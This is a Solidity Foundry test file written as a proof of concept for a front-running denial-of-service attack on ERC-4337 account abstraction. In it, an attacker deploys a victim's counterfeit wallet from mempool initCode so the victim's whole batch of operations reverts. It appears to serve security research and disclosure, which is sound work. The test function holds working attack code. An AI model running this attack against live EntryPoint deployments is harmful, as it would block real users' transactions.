// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol"; //!
import {IEntryPoint} from "account-abstraction/interfaces/IEntryPoint.sol"; //!
import {EntryPoint} from "account-abstraction/core/EntryPoint.sol"; //!
import {PackedUserOperation} from "account-abstraction/interfaces/PackedUserOperation.sol"; //! 구조체
import {ERC1967Proxy} from "../lib/openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "account-abstraction/samples/SimpleAccountFactory.sol";
// import "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";
// import "./UserOpUtils.sol";
import "account-abstraction/interfaces/IAccount.sol";
import "../lib/openzeppelin-contracts/contracts/utils/cryptography/ECDSA.sol";
import "../lib/openzeppelin-contracts/contracts/proxy/utils/Initializable.sol";
import "../lib/openzeppelin-contracts/contracts/proxy/utils/UUPSUpgradeable.sol";
import "./PrivateKeyDriver.sol";
contract DoSexploit is Test {
    EntryPoint entrypoint;
    SimpleAccountFactory simpleaccountfactory;
    PackedUserOperation[] packedUserOp;
    PackedUserOperation userOp;
    PackedUserOperation userOp1;
    PackedUserOperation userOp2;
    PackedUserOperation userOp3;

    PackedUserOperation[] packedUserOp1;

    address public notJoon; // the nickname I used is my two close brothers.
    address public frost;
    address public frost1;
    address public frost2;

    uint256 public notJoonPrivateKey;
    uint256 public frostPrivateKey;
    uint256 public frost1PrivateKey;
    uint256 public frost2PrivateKey;

    function setUp() public {
        /*
I made 4 address for the userOp.

The address notJoon is for the attacker who occurs the DoS frontrunning attack.

the actual target that that attacker aims is the frost userOp, which would be in the first when executing the userOp.

the purpose of the attack is to revert the frost's new AA wallet by frontrunning and create the wallet address before frost creates one which would be created in the createSender function in account-abstraction-test/lib/account-abstraction/contracts/core/SenderCreator.sol

But if the attacker achieves to frontrun and creates the AA wallet, than the whole execution including frost, frost1, and frost2's handleOp would be reverted because there are no try-catch codes during this verification.

The CA that the attacker would create can have no codes like
contract A{}, which means that the attack cost could be very low.
Plus, if the userOp array includes thousands of orders, the whole orders can be all reverted.

The reference codes I used for testing is mostly from eth-infinitlism, and from other blogs like https://piatoss3612.tistory.com/161.

There would be some annotation written in korean language, which is my first language. But those are just the annotations for me to fully understand the ERC-4337.

 */

        // notJoon 지갑 생성
        notJoonPrivateKey = 0x1; // 간단한 예시를 위해 1을 사용
        notJoon = vm.addr(notJoonPrivateKey);
        vm.label(notJoon, "notJoon");
        vm.deal(notJoon, 100 ether);

        // frost 지갑 생성
        frostPrivateKey = 0x2; // 간단한 예시를 위해 2를 사용
        frost = vm.addr(frostPrivateKey);
        vm.label(frost, "frost");
        vm.deal(frost, 100 ether);

        // frost1 지갑 생성
        frost1PrivateKey = 0x3; // 간단한 예시를 위해 3을 사용
        frost1 = vm.addr(frost1PrivateKey);
        vm.label(frost1, "frost1");
        vm.deal(frost1, 100 ether);

        // frost2 지갑 생성
        frost2PrivateKey = 0x4; // 간단한 예시를 위해 4를 사용
        frost2 = vm.addr(frost2PrivateKey);
        vm.label(frost2, "frost2");
        vm.deal(frost2, 100 ether);
    }
    //---------------------
    //|                   |
    //|    main exploit   |
    //|                   |
    //---------------------

    function test_addressDoS() public {
        entrypoint = new EntryPoint();
        simpleaccountfactory = new SimpleAccountFactory(entrypoint);
        address accountFactoryAddress = address(simpleaccountfactory);
        bytes memory initCodesfrost = generateInitCode(
            accountFactoryAddress,
            address(frost),
            1337 // initcodes 넣기. //!Vector: 이 salt가 그대로 노출되는 게 문제라는 거. 이걸 그자리에서 난수로 만들어야해
        );

        bytes memory initCodesfrost1 = generateInitCode(
            accountFactoryAddress,
            address(frost1),
            1337 // initcodes 넣기. //!Vector: 이 salt가 그대로 노출되는 게 문제라는 거. 이걸 그자리에서 난수로 만들어야해
        );

        bytes memory initCodesfrost2 = generateInitCode(
            accountFactoryAddress,
            address(frost2),
            1337 // initcodes 넣기. //!Vector: 이 salt가 그대로 노출되는 게 문제라는 거. 이걸 그자리에서 난수로 만들어야해
        );

        bytes memory initCodesnotJoon = generateInitCode(
            accountFactoryAddress,
            address(notJoon),
            1337 // initcodes 넣기. //!Vector: 이 salt가 그대로 노출되는 게 문제라는 거. 이걸 그자리에서 난수로 만들어야해
        );

        //*** sender1에 들어갈 deterministic한 주소 미리 값 받아오기(원래는 번들러가 했어야 함) */
        address prefrost = simpleaccountfactory.getAddress(
            address(frost),
            1337
        );
        address prefrost1 = simpleaccountfactory.getAddress(
            address(frost1),
            1337
        );
        address prefrost2 = simpleaccountfactory.getAddress(
            address(frost2),
            1337
        );
        address prenotJoon = simpleaccountfactory.getAddress(
            address(notJoon),
            1337
        );

        vm.deal(prefrost, 1000000000000 ether);
        vm.deal(prefrost1, 1000000000000 ether);
        vm.deal(prefrost2, 1000000000000 ether);
        vm.deal(prenotJoon, 1000000000000 ether);

        //***make UserOp array for sending!! userOp1을 터뜨려서 나머지 2랑 3을 다 DoS맥이는 게 목적. */
        userOp = createPackedUserOperation(
            address(prefrost), // frost 주소 <-이걸 미리 계산한 주소로 넣었어야함.
            initCodesfrost, // initCodes
            "", // data
            bytes32(uint256(1000000) | (uint256(2000000) << 128)), // gasLimits
            bytes32(uint256(3000000) | (uint256(4000000) << 128)) // gasFees
        ); // create userOp without signiture.

        userOp1 = createPackedUserOperation(
            address(prefrost1), // frost 주소
            initCodesfrost1, // initCodes
            //[20바이트: SimpleAccountFactory 주소]
            //[4바이트: createAccount 함수 선택자]
            //[32바이트: owner 주소 (좌측 0 패딩)]
            //[32바이트: salt 값]
            "", // data
            bytes32(uint256(1000000) | (uint256(2000000) << 128)), // gasLimits
            bytes32(uint256(3000000) | (uint256(4000000) << 128)) // gasFees
        );
        userOp2 = createPackedUserOperation(
            address(prefrost2), // frost 주소
            initCodesfrost2, // initCodes
            "", // data
            bytes32(uint256(1000000) | (uint256(2000000) << 128)), // gasLimits
            bytes32(uint256(3000000) | (uint256(4000000) << 128)) // gasFees
        );
        userOp3 = createPackedUserOperation(
            address(prenotJoon), // frost 주소
            initCodesnotJoon, // initCodes
            "", // data
            bytes32(uint256(1000000) | (uint256(2000000) << 128)), // gasLimits
            bytes32(uint256(3000000) | (uint256(4000000) << 128)) // gasFees
        );

        bytes32 frosthash = entrypoint.getUserOpHash(userOp);
        bytes32 frosthash1 = entrypoint.getUserOpHash(userOp1);
        bytes32 frosthash2 = entrypoint.getUserOpHash(userOp2);
        bytes32 notJoonhash = entrypoint.getUserOpHash(userOp3);

        bytes memory notJoonsig = signUserOp(0x1, notJoonhash);
        bytes memory frostsig = signUserOp(0x2, frosthash);
        bytes memory frost1sig = signUserOp(0x3, frosthash1);
        bytes memory frost2sig = signUserOp(0x4, frosthash2);

        //*** 생성한 sig넣기 */
        userOp.signature = frostsig;
        userOp1.signature = frost1sig;
        userOp2.signature = frost2sig;
        userOp3.signature = notJoonsig;

        packedUserOp.push(userOp);
        packedUserOp.push(userOp1);
        packedUserOp.push(userOp2); // 우리가 공격할 userOp를 만들었음.
        packedUserOp1.push(userOp3);
        vm.prank(notJoon); // 프론트러닝을 가정함!
        entrypoint.handleOps(packedUserOp1, payable(notJoon)); // test handleOps
        vm.prank(notJoon);
        this.createSender(initCodesfrost); // attack. In reality, the attacker would get the initCodes from the mempool and simply use it for the CREATE2 function and deploy it.
        vm.expectRevert();
        vm.prank(frost); // then the vector transaction will revert.
        entrypoint.handleOps(packedUserOp, payable(frost));
    }

    //---------------------
    //|                   |
    //| Utility Functions |
    //|                   |
    //---------------------

    function createSender(
        bytes calldata initCode
    ) external returns (address sender) {
        address factory = address(bytes20(initCode[0:20]));
        bytes memory initCallData = initCode[20:];
        bool success;
        /* solhint-disable no-inline-assembly */
        assembly ("memory-safe") {
            success := call(
                gas(),
                factory,
                0,
                add(initCallData, 0x20),
                mload(initCallData),
                0,
                32
            )
            sender := mload(0)
        }
        if (!success) {
            sender = address(0);
        }
    }

    // createAccount 함수의 선택자
    bytes4 private constant CREATE_ACCOUNT_SELECTOR =
        bytes4(keccak256("createAccount(address,uint256)"));

    function generateInitCode(
        address factoryAddress,
        address owner,
        uint256 salt
    ) public pure returns (bytes memory) {
        bytes memory factoryAddressBytes = abi.encodePacked(factoryAddress);
        bytes memory calldata1 = abi.encodeWithSelector(
            CREATE_ACCOUNT_SELECTOR,
            owner,
            salt
        );

        return bytes.concat(factoryAddressBytes, calldata1);
    }

    // 선택적: initCode의 각 부분을 개별적으로 확인하기 위한 함수
    function getInitCodeParts(
        address factoryAddress,
        address owner,
        uint256 salt
    )
        public
        pure
        returns (bytes memory factoryAddressBytes, bytes memory calldata1)
    {
        factoryAddressBytes = abi.encodePacked(factoryAddress);
        calldata1 = abi.encodeWithSelector(
            CREATE_ACCOUNT_SELECTOR,
            owner,
            salt
        );
    }

    // 선택적: 생성된 initCode의 길이를 확인하는 함수
    function getInitCodeLength(
        address factoryAddress,
        address owner,
        uint256 salt
    ) public pure returns (uint256) {
        return generateInitCode(factoryAddress, owner, salt).length;
    }

    function createPackedUserOperation(
        address notJoon,
        bytes memory initCodes,
        bytes memory data,
        bytes32 gasLimits,
        bytes32 gasFees
    ) public pure returns (PackedUserOperation memory) {
        PackedUserOperation memory userOp = PackedUserOperation({
            sender: address(notJoon),
            nonce: 0,
            initCode: initCodes,
            callData: data,
            accountGasLimits: gasLimits,
            preVerificationGas: 2100023904093208525,
            gasFees: gasFees,
            paymasterAndData: "",
            signature: ""
        });

        return userOp;
    }

    //---------------------
    //|                   |
    //|       ECDSA       |
    //|                   |
    //---------------------

    function signUserOp(
        uint256 privateKey,
        bytes32 userOpHash
    ) public pure returns (bytes memory) {
        bytes32 digest = toEthSignedMessageHash(userOpHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
        return abi.encodePacked(r, s, v);
    }
    function toEthSignedMessageHash(
        bytes32 messageHash
    ) internal pure returns (bytes32 digest) {
        /// @solidity memory-safe-assembly
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32") // 32 is the bytes-length of messageHash
            mstore(0x1c, messageHash) // 0x1c (28) is the length of the prefix
            digest := keccak256(0x00, 0x3c) // 0x3c is the length of the prefix (0x1c) + messageHash (0x20)
        }
    }
}

// contract Account is IAccount, UUPSUpgradeable, Initializable {
//     using ECDSA for bytes32;

//     address public owner;
//     IEntryPoint private immutable _entryPoint;

//     event AAWalletInitialized(
//         IEntryPoint indexed entryPoint,
//         address indexed owner
//     );

//     modifier onlyOwner() {
//         require(msg.sender == owner, "only owner");
//         _;
//     }

//     /// @inheritdoc UUPSUpgradeable
//     function _authorizeUpgrade(
//         address newImplementation
//     ) internal view override onlyOwner {
//         // for UUPS upgradeable contract
//         (newImplementation);
//     }

//     constructor(IEntryPoint anEntryPoint) {
//         _entryPoint = anEntryPoint;
//         _disableInitializers();
//     }

//     function entryPoint() public view virtual returns (IEntryPoint) {
//         return _entryPoint;
//     }

//     function initialize(address anOwner) public virtual initializer {
//         owner = anOwner;
//         emit AAWalletInitialized(_entryPoint, owner);
//     }

//     function _validateSignature(
//         PackedUserOperation calldata userOp,
//         bytes32 userOpHash
//     ) internal virtual returns (uint256 validationData) {
//         bytes32 hash = toEthSignedMessageHash(userOpHash);
//         if (owner != hash.recover(userOp.signature))
//             return SIG_VALIDATION_FAILED;
//         return 0;
//     }

//     function toEthSignedMessageHash(
//         bytes32 messageHash
//     ) internal pure returns (bytes32 digest) {
//         /// @solidity memory-safe-assembly
//         assembly {
//             mstore(0x00, "\x19Ethereum Signed Message:\n32") // 32 is the bytes-length of messageHash
//             mstore(0x1c, messageHash) // 0x1c (28) is the length of the prefix
//             digest := keccak256(0x00, 0x3c) // 0x3c is the length of the prefix (0x1c) + messageHash (0x20)
//         }
//     }

//     function validateUserOp(
//         PackedUserOperation calldata userOp,
//         bytes32 userOpHash,
//         uint256 missingAccountFunds
//     ) external virtual override returns (uint256 validationData) {
//         _requireFromEntryPoint();
//         validationData = _validateSignature(userOp, userOpHash);
//         if (missingAccountFunds > 0) {
//             (bool success, ) = payable(msg.sender).call{
//                 value: missingAccountFunds,
//                 gas: type(uint256).max
//             }("");
//             (success);
//         }
//         return validationData;
//     }

//     function _requireFromEntryPoint() internal view virtual {
//         require(
//             msg.sender == address(entryPoint()),
//             "account: not from EntryPoint"
//         );
//     }

//     receive() external payable {}

//     function execute(
//         address dest,
//         uint256 value,
//         bytes calldata func
//     ) external {
//         _requireFromEntryPoint();
//         _call(dest, value, func);
//     }

//     function _call(address target, uint256 value, bytes memory data) internal {
//         (bool success, bytes memory result) = target.call{value: value}(data);
//         if (!success) {
//             assembly {
//                 revert(add(result, 32), mload(result))
//             }
//         }
//     }

//     function withdrawDepositTo(
//         address payable withdrawAddress,
//         uint256 amount
//     ) public onlyOwner {
//         entryPoint().withdrawTo(withdrawAddress, amount);
//     }
// }

// contract AccountFactory {
//     event AccountCreated(address indexed account, address indexed owner);

//     function createAccount(
//         address owner,
//         uint256 salt
//     ) public returns (Account) {
//         address addr = getAddress(owner, salt);
//         uint codeSize;
//         assembly {
//             codeSize := extcodesize(addr)
//         }
//         if (codeSize > 0) {
//             return Account(payable(addr));
//         }
//         bytes memory creationCode = type(Account).creationCode;
//         bytes memory bytecode = abi.encodePacked(
//             creationCode,
//             abi.encode(owner)
//         );
//         address account;
//         assembly {
//             account := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
//         }
//         emit AccountCreated(account, owner);
//         return Account(payable(account));
//     }

//     function getAddress(
//         address owner,
//         uint256 salt
//     ) public view returns (address) {
//         bytes memory bytecode = abi.encodePacked(
//             type(Account).creationCode,
//             abi.encode(owner)
//         );
//         bytes32 hash = keccak256(
//             abi.encodePacked(
//                 bytes1(0xff),
//                 address(this),
//                 salt,
//                 keccak256(bytecode)
//             )
//         );
//         return address(uint160(uint(hash)));
//     }
// }
